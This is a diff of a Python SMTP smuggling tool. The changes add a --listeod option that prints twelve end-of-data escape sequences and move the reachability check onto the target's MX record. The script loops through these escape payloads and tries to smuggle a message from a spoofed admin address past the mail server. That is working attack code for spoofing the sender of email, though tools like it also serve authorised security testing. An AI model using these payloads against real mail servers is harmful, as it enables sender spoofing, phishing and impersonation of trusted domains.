@@ -1,5 +1,4 @@
-#! /bin/python3
-
+#! /usr/bin/env python3
 #
 # ---------------------------------------------------------------------------------------------------------------
 #    _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
@@ -36,21 +35,6 @@ email_body_one = 'Here is the text of your email'
 admin_from = 'admin@mymailserver.com'
 end_of_data_command = '\r\n.\r\n'
 
-
-#Smgggling Strings (0-11):
-#smtp_smuggle_escape = \r\n.\r
-#smtp_smuggle_escape = \r.\r
-#smtp_smuggle_escape = '\r\n\x00.\r'
-#smtp_smuggle_escape = '\r\n\x00.\n'
-#smtp_smuggle_escape = \r\n\x00.\r\n
-#smtp_smuggle_escape = \r\n.\x00\r\n
-#smtp_smuggle_escape = '\r\n.'
-#smtp_smuggle_escape = \n.\r\n
-#smtp_smuggle_escape = \r.\r\n
-#smtp_smuggle_escape = \n\n.\r\n
-#smtp_smuggle_escape = \r\n.\r
-#smtp_smuggle_escape = \n.\n
-
 smtp_smuggle_escapes = [
     '\r\n.\r',
     '\r.\r',
@@ -70,6 +54,35 @@ smtp_smuggle_escapes = [
 smtp_test_nr = 0
 
 # -------------------------------------------------
+
+
+def __list_eod():
+    print(
+    """\
+    Smugggling Strings (0-11):
+    --------------------------
+
+    0 - smtp_smuggle_escape =  {!r}
+    1 - smtp_smuggle_escape =  {!r}
+    2 - smtp_smuggle_escape =  {!r}
+    3 - smtp_smuggle_escape =  {!r}
+    4 - smtp_smuggle_escape =  {!r}
+    5 - smtp_smuggle_escape =  {!r}
+    6 - smtp_smuggle_escape =  {!r}
+    7 - smtp_smuggle_escape =  {!r}
+    8 - smtp_smuggle_escape =  {!r}
+    9 - smtp_smuggle_escape =  {!r}
+    10 - smtp_smuggle_escape = {!r}
+    11 - smtp_smuggle_escape = {!r}
+    """.format(
+        '\r\n.\r', '\r.\r', '\r\n\x00.\r', '\r\n\x00.\n',
+        '\r\n\x00.\r\n', '\r\n.\x00\r\n', '\r\n.', '\n.\r\n',
+        '\r.\r\n', '\n\n.\r\n', '\r\n.\r', '\n.\n'
+        ))
+
+    import sys
+    sys.exit(0)
+
 
 def __local_t(dt):
     if dt == 1:
@@ -113,14 +126,14 @@ def resolve_domainname(server):
         sys.exit(0)
 
 
-def is_reachable(host, port):
+def is_reachable(mx_1, port):
     try:
-        socket.create_connection((host, port), timeout=5)
+        socket.create_connection((mx_1, port), timeout=5)
         #return True
     except (socket.timeout, socket.error):
         import sys
         #return False
-        print(f'\n[!] Error by domain resolve: {host} !')
+        print(f'\n[!] Error by domain resolve: {mx_1} Port {port} seems down?!')
         sys.exit(0)
 
 
@@ -476,7 +489,10 @@ def main():
     parser.add_argument('--rcpt', type=str, default=srcpt, required=False, help='rcpt address')
     parser.add_argument('--mode', type=str, default='def', help='Rawmode = raw or Default = def')
     parser.add_argument('--forcetls', default=None, action="store_true", required=False, help="Force connection via SSL/TLS")
+    parser.add_argument('--listeod', default=None, action="store_true", required=False, help="Lists end of data sequences")
     args = parser.parse_args()
+
+    if args.listeod: __list_eod()
 
     password = getpass.getpass(prompt='Enter password: ')
     #For static pw testing. Risky! ;)
@@ -487,22 +503,22 @@ def main():
     username = args.user
     rcpt = args.rcpt
     force_tls=args.forcetls
-    global smtp_test_nr
 
+    global smtp_test_nr
     global admin_from
     admin_from = serv_to_email(server)
 
     # Chcking for reachable and domain resolving stuff:
     #
     #resolve_domainname(server)
-    is_reachable(server, port)
-    get_mx_records(server)
+    mx_1 = get_mx_records(server)
+    is_reachable(mx_1, port)
 
     for es in smtp_smuggle_escapes:
         print(f"""
     --- ---------------------------------------------------------------------------
     [{smtp_test_nr}] Trying to smuggle {admin_from} /w escape payload: <{repr(es)}>
-        Time: ({__local_t(1)}) {force_tls}
+        Time: ({__local_t(1)})
     --- ---------------------------------------------------------------------------
     """)
         time.sleep(1.1)
